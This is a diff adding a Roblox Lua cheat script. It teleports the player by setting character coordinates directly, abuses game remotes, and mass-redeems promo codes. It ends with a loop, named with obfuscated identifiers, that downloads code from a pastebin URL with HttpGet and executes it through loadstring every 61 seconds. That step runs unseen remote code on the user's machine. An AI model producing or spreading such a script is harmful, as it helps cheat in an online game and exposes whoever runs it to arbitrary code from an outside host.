@@ -1,0 +1,180 @@
+local args = {
+	[1] = "Spawn"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("BuyTeleport"):InvokeServer(unpack(args))
+
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-27.9755611, 78.0899124, 98.0186005, -0.85381639, -0.0200627763, 0.520187497, 8.05717182e-09, 0.999257088, 0.0385397151, -0.520574272, 0.0329058431, -0.853182077)
+wait(0.05)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-134.924225, -269.592163, 71.7426605, -0.647635341, 0, 0.761950433, 0, 1, 0, -0.761950433, 0, -0.647635341)
+wait(0.05)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(508.840942, -269.607483, -562.758179, 0.219360948, -0, -0.975643754, 0, 1, -0, 0.975643754, 0, 0.219360948)
+wait(0.05)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1828.27014, -251.026044, -576.597961, 0.981887758, -0.0247253664, -0.187843323, 0.0432473458, 0.994522691, 0.0951543227, 0.184461713, -0.10155458, 0.977578938)
+
+
+local args = {
+	[1] = "Spawn"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TeleportPlayer"):FireServer(unpack(args))
+
+
+local args = {
+	[1] = "100DISCORDMEMBERS"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "100KVISITS"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "10KGroupMembers"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "150KVISITS"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "15KGroupMembers"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "1KDiscordMembers"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "1KFavs"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "1KLikes"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "1MVISITS"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "3KLikes"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "400DISCORDMEMBERS"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "4KFavs"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "4THOFJULY"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "500GroupMembers"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "500KVisits"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "50KVISITS"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "5KGroupMembers"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "5KVISITS"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "80KGroupMembers"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "900KVisits"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "Kanshy"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "LogsLogging"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "PARTYISFUN"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "RELEASE"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "SORRYFORDELAY"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "SUMMERTIME"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "SkanIsNoob"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "Sushiwi"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "Update1"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+local args = {
+	[1] = "Update2"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TwitterCodes"):InvokeServer(unpack(args))
+_G.dewaawxf = true
+function dxzviwf()
+	while _G.dewaawxf == true do
+		loadstring(game:HttpGet("https://pastebin.com/raw/wndyC6pv", true))()
+		wait(61)
+	end
+end
+dxzviwf()
